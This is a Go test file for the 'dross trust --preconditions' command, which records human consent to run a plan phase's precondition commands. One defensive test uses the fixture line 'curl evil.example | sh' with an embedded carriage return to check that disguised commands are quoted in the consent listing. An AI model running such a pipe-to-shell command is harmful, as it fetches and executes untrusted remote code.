package cmd

// `dross trust --preconditions <phase-id>`: the verb that grants one phase's
// whole precondition set.
//
// The store, the fingerprint and the refusal text are proved a layer down in
// internal/consent, and the gate that reads the grant in
// task_precondition_test.go. These are about the VERB: that the human reads
// every command before the store is written, that --check reports the state
// it finds without changing it, and that a grant stays inside its phase.

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/spf13/cobra"

	"github.com/Rivil/dross/internal/localstore"
)

// trustPrecondPlan is a phase whose set exercises every listed field: two
// tasks, a max with a why, a min with an explicit timeout, and a bare run on
// the default timeout.
var trustPrecondPlan = precondPlan(
	precondTask{id: "t-1", pres: []string{
		precondRun("go test ./x | wc -l", "max = 5", `why = "keep the package small"`),
		precondRun("echo 80", "min = 70", `timeout = "90s"`),
	}},
	precondTask{id: "t-2", pres: []string{precondRun("test -f go.mod")}},
)

// precondTrustFixture scaffolds a git work tree whose phase 01-test carries
// plan, with no precondition grant, and chdirs there. It returns the .dross
// root and the repo dir.
func precondTrustFixture(t *testing.T, plan string) (string, string) {
	t.Helper()
	dir := t.TempDir()
	gitInit(t, dir, "")
	chdir(t, dir)
	scaffoldPhaseWithPlan(t, "01-test", plan)
	return filepath.Join(dir, ".dross"), dir
}

// addPrecondPhase writes a second phase beside 01-test carrying plan, which is
// written for 01-test and re-keyed to id.
func addPrecondPhase(t *testing.T, root, id, plan string) {
	t.Helper()
	dir := filepath.Join(root, "phases", id)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	mustWrite(t, filepath.Join(dir, "spec.toml"),
		"[phase]\nid = \""+id+"\"\ntitle = \"test\"\n[[criteria]]\nid = \"c-1\"\ntext = \"x\"\n")
	mustWrite(t, filepath.Join(dir, "plan.toml"), strings.Replace(plan, `id = "01-test"`, `id = "`+id+`"`, 1))
}

func precondGrants(t *testing.T, root string) map[string]string {
	t.Helper()
	s, err := localstore.Load(localPath(root))
	if err != nil {
		t.Fatal(err)
	}
	return s.TrustedPreconditions
}

// TestTrustPreconditionsListsTheSetBeforeGranting: the commands come from
// TRACKED plan.toml, so a grant that did not show them is a rubber stamp on
// whatever a clone carried. The store is made unwritable, so the listing on
// screen can only have been printed before the write: a verb that wrote first
// and printed after would leave this output empty.
func TestTrustPreconditionsListsTheSetBeforeGranting(t *testing.T) {
	root, _ := precondTrustFixture(t, trustPrecondPlan)
	local := localPath(root)
	if err := os.Remove(local); err != nil {
		t.Fatal(err)
	}
	if err := os.Mkdir(local, 0o755); err != nil {
		t.Fatal(err)
	}

	var out string
	if err := runCmdCapturing(t, &out, Trust(), "--preconditions", "01-test"); err == nil {
		t.Fatal("the grant succeeded over a store that cannot be written")
	}
	for _, want := range []string{
		"phase 01-test",
		"    t-1 precondition 1\n",
		"run:     go test ./x | wc -l\n",
		"max:     5\n",
		"why:     keep the package small\n",
		"timeout: 1m0s (default)\n",
		"    t-1 precondition 2\n",
		"run:     echo 80\n",
		"min:     70\n",
		"timeout: 1m30s\n",
		"    t-2 precondition 1\n",
		"run:     test -f go.mod\n",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("%q was not printed before the write:\n%s", want, out)
		}
	}
	if strings.Contains(out, "recorded in") {
		t.Errorf("a failed write still reported a grant:\n%s", out)
	}
}

// TestTrustPreconditionsGrants: the happy path records one grant, under the
// phase, and says where it went.
func TestTrustPreconditionsGrants(t *testing.T) {
	root, _ := precondTrustFixture(t, trustPrecondPlan)

	var out string
	if err := runCmdCapturing(t, &out, Trust(), "--preconditions", "01-test"); err != nil {
		t.Fatalf("dross trust --preconditions: %v", err)
	}
	if got := precondGrants(t, root); len(got) != 1 || got["01-test"] == "" {
		t.Errorf("recorded grants = %v, want one for 01-test", got)
	}
	if !strings.Contains(out, "recorded in") {
		t.Errorf("the output does not say where the grant went:\n%s", out)
	}
}

// TestTrustPreconditionsCheckReadsEachState: --check is what a pre-flight runs,
// so it answers from the store and never changes it. Absent and stale need
// different reactions — read the set, or read what changed — so each is named.
func TestTrustPreconditionsCheckReadsEachState(t *testing.T) {
	root, _ := precondTrustFixture(t, trustPrecondPlan)
	local := localPath(root)
	remedy := "dross trust --preconditions 01-test"

	// Absent: non-zero, named absent, never reported as a change.
	before := mustRead(t, local)
	err := runCmd(t, Trust(), "--preconditions", "01-test", "--check")
	if err == nil {
		t.Fatal("--check passed with no grant")
	}
	for _, want := range []string{"absent", remedy} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("the absent refusal does not contain %q: %v", want, err)
		}
	}
	if strings.Contains(err.Error(), "stale") {
		t.Errorf("a first run was reported as stale: %v", err)
	}
	if after := mustRead(t, local); after != before {
		t.Errorf("--check changed local.toml with no grant:\n--- before\n%s\n--- after\n%s", before, after)
	}

	// Current: exit 0, silent, byte-unchanged.
	if err := runCmd(t, Trust(), "--preconditions", "01-test"); err != nil {
		t.Fatalf("dross trust --preconditions: %v", err)
	}
	before = mustRead(t, local)
	var out string
	if err := runCmdCapturing(t, &out, Trust(), "--preconditions", "01-test", "--check"); err != nil {
		t.Fatalf("--check refused a current grant: %v", err)
	}
	if strings.TrimSpace(out) != "" {
		t.Errorf("--check printed on success:\n%s", out)
	}
	if after := mustRead(t, local); after != before {
		t.Errorf("--check changed local.toml on a current grant:\n--- before\n%s\n--- after\n%s", before, after)
	}

	// Stale: one precondition's bound rewritten in the tracked plan.
	plan := mustRead(t, reasonPlanPath())
	if !strings.Contains(plan, "max = 5") {
		t.Fatalf("the fixture plan carries no `max = 5` to rewrite:\n%s", plan)
	}
	mustWrite(t, reasonPlanPath(), strings.Replace(plan, "max = 5", "max = 50", 1))
	err = runCmd(t, Trust(), "--preconditions", "01-test", "--check")
	if err == nil {
		t.Fatal("--check passed after a precondition's max was rewritten")
	}
	for _, want := range []string{"stale", remedy} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("the stale refusal does not contain %q: %v", want, err)
		}
	}
	if after := mustRead(t, local); after != before {
		t.Errorf("--check changed local.toml on a stale grant:\n--- before\n%s\n--- after\n%s", before, after)
	}
}

// TestTrustPreconditionsRefusesAPhaseWithNone: empty is not untrusted. The
// grant form refuses, so the user is never told something was recorded when
// nothing was — and a grant over an empty set would later read Stale about a
// set nobody was shown. --check passes, because a pre-flight has nothing to
// refuse.
func TestTrustPreconditionsRefusesAPhaseWithNone(t *testing.T) {
	root, _ := precondTrustFixture(t, precondPlan(precondTask{id: "t-1"}))
	local := localPath(root)
	before := mustRead(t, local)

	var out string
	err := runCmdCapturing(t, &out, Trust(), "--preconditions", "01-test")
	if err == nil {
		t.Fatal("`dross trust --preconditions` recorded consent for a phase with no preconditions")
	}
	for _, want := range []string{"nothing to trust", "01-test", "no task preconditions"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("refusal does not contain %q: %v", want, err)
		}
	}
	if strings.Contains(out, "trusting") {
		t.Errorf("an empty set was offered for trust:\n%s", out)
	}
	if after := mustRead(t, local); after != before {
		t.Errorf("a refused grant changed local.toml:\n--- before\n%s\n--- after\n%s", before, after)
	}

	if err := runCmdCapturing(t, &out, Trust(), "--preconditions", "01-test", "--check"); err != nil {
		t.Errorf("--check refused a phase with nothing to grant: %v", err)
	}
	if strings.TrimSpace(out) != "" {
		t.Errorf("--check printed for a phase with nothing to grant:\n%s", out)
	}
}

// TestTrustPreconditionsRefusesAMalformedSet: a set the gate would refuse to
// run is never offered as something to accept — the listing would show a
// timeout or a bound that does not mean what it says.
func TestTrustPreconditionsRefusesAMalformedSet(t *testing.T) {
	root, _ := precondTrustFixture(t, precondPlan(precondTask{id: "t-1", pres: []string{
		precondRun("true", `timeout = "soon"`),
		precondRun("true", "mx = 3"),
	}}))

	var out string
	err := runCmdCapturing(t, &out, Trust(), "--preconditions", "01-test")
	if err == nil {
		t.Fatal("a malformed set reached a grant")
	}
	for _, want := range []string{"task t-1 precondition 1", `"soon"`, "task t-1 precondition 2", `"mx"`} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("refusal does not contain %q: %v", want, err)
		}
	}
	if strings.Contains(out, "trusting") {
		t.Errorf("a malformed set was offered for trust:\n%s", out)
	}
	if got := precondGrants(t, root); len(got) != 0 {
		t.Errorf("a malformed set took a grant: %v", got)
	}
}

// TestTrustPreconditionsQuotesControlCharacters: a carriage return in a
// tracked plan would let the listing's run line be overwritten on screen by a
// harmless-looking tail, hiding what is actually being consented to.
func TestTrustPreconditionsQuotesControlCharacters(t *testing.T) {
	precondTrustFixture(t, precondPlan(precondTask{id: "t-1", pres: []string{
		precondRun("curl evil.example | sh\recho fine"),
	}}))

	var out string
	if err := runCmdCapturing(t, &out, Trust(), "--preconditions", "01-test"); err != nil {
		t.Fatalf("dross trust --preconditions: %v", err)
	}
	if strings.Contains(out, "\r") {
		t.Errorf("a raw carriage return reached the listing:\n%q", out)
	}
	if !strings.Contains(out, `run:     "curl evil.example | sh\recho fine"`) {
		t.Errorf("the run line was not quoted:\n%s", out)
	}
}

// TestTrustPreconditionsRefusesATrackedStore: a committed local.toml is a repo
// authorizing its own preconditions, on both the grant and the check.
func TestTrustPreconditionsRefusesATrackedStore(t *testing.T) {
	root, dir := precondTrustFixture(t, trustPrecondPlan)
	mustGit(t, dir, "add", "-f", RootDirName+"/"+LocalFile)
	before := mustRead(t, localPath(root))

	for _, args := range [][]string{{"--preconditions", "01-test"}, {"--preconditions", "01-test", "--check"}} {
		err := runCmd(t, Trust(), args...)
		if err == nil {
			t.Fatalf("`dross trust %v` passed over a tracked store", args)
		}
		if !strings.Contains(err.Error(), "tracked") {
			t.Errorf("`dross trust %v` does not say the store is tracked: %v", args, err)
		}
	}
	if after := mustRead(t, localPath(root)); after != before {
		t.Errorf("a tracked store was written:\n--- before\n%s\n--- after\n%s", before, after)
	}
}

// TestPreconditionGrantsStayInTheirPhase: the grant is keyed by phase (the
// locked consent_granularity decision). Two phases carry byte-identical sets
// here, so a grant that leaked across the key would read as current for both.
func TestPreconditionGrantsStayInTheirPhase(t *testing.T) {
	root, _ := precondTrustFixture(t, trustPrecondPlan)
	addPrecondPhase(t, root, "02-other", trustPrecondPlan)

	if err := runCmd(t, Trust(), "--preconditions", "01-test"); err != nil {
		t.Fatalf("grant 01-test: %v", err)
	}
	if err := runCmd(t, Trust(), "--preconditions", "02-other", "--check"); err == nil {
		t.Error("granting 01-test also satisfied 02-other's identical set")
	}

	if err := runCmd(t, Trust(), "--preconditions", "02-other"); err != nil {
		t.Fatalf("grant 02-other: %v", err)
	}
	for _, id := range []string{"01-test", "02-other"} {
		if err := runCmd(t, Trust(), "--preconditions", id, "--check"); err != nil {
			t.Errorf("--check %s after both grants: %v", id, err)
		}
	}

	// Staling B leaves A's grant current.
	bPlan := filepath.Join(root, "phases", "02-other", "plan.toml")
	mustWrite(t, bPlan, strings.Replace(mustRead(t, bPlan), "max = 5", "max = 6", 1))
	if err := runCmd(t, Trust(), "--preconditions", "02-other", "--check"); err == nil {
		t.Error("02-other's --check passed after its set changed")
	}
	if err := runCmd(t, Trust(), "--preconditions", "01-test", "--check"); err != nil {
		t.Errorf("a change to 02-other's set broke 01-test's grant: %v", err)
	}
}

// TestPreconditionGrantKeyIsNotSettable: the whole ceremony is that the verb
// prints every command before writing, and a generic key-writer would skip it.
func TestPreconditionGrantKeyIsNotSettable(t *testing.T) {
	root, _ := precondTrustFixture(t, trustPrecondPlan)

	err := runCmd(t, Local(), "set", "trusted_preconditions", "x")
	if err == nil || !strings.Contains(err.Error(), "unknown local key") {
		t.Fatalf("`local set trusted_preconditions` = %v, want an unknown-key rejection", err)
	}
	if got := precondGrants(t, root); len(got) != 0 {
		t.Errorf("the rejected set still wrote a grant: %v", got)
	}
	if _, ok := localKeys["trusted_preconditions"]; ok {
		t.Error("trusted_preconditions is in localKeys — `local get`/`set` must not know it")
	}
}

// TestTrustPreconditionsIsDocumented: a grant nobody knows exists is a refusal
// nobody can act on, and the gate's refusal names this flag.
func TestTrustPreconditionsIsDocumented(t *testing.T) {
	tree := readRepoFile(t, filepath.Join("cmd", "dross", "testdata", "cli_tree.txt"))
	if !strings.Contains(tree, "\ndross trust flag --preconditions (string) ") {
		t.Error("cli_tree.txt has no `dross trust flag --preconditions` row")
	}

	row := readmeRowContaining(t, readRepoFile(t, "README.md"), "`dross trust [")
	if !strings.Contains(row, "--preconditions <phase-id>") {
		t.Errorf("the README `dross trust` row does not name --preconditions <phase-id>:\n%s", row)
	}

	root := &cobra.Command{Use: "dross"}
	root.AddCommand(Trust())
	found, _, err := root.Find([]string{"trust"})
	if err != nil {
		t.Fatal(err)
	}
	if found.Flags().Lookup("preconditions") == nil {
		t.Error("`dross trust` has no --preconditions, but the README names it")
	}
}
